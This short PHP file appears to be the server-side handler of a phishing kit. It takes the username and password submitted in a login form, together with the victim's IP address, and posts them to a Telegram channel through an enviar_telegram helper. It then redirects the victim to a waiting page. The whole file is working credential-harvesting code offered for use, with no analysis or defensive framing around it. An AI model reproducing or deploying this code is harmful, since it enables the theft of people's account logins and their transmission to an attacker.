<?php


include '../conf.ini.php';


    $mss = "➖[C0MF1RM4]➖
💵 USR : {$_POST['user']}
💵 PSW : {$_POST['pass']}
➖➖➖ INFO ➖➖➖
🌐 IP : {$_SERVER['REMOTE_ADDR']}
➖➖➖➖➖➖➖➖➖➖➖➖";

enviar_telegram($mss);

header('location: ../espera.php');

?>
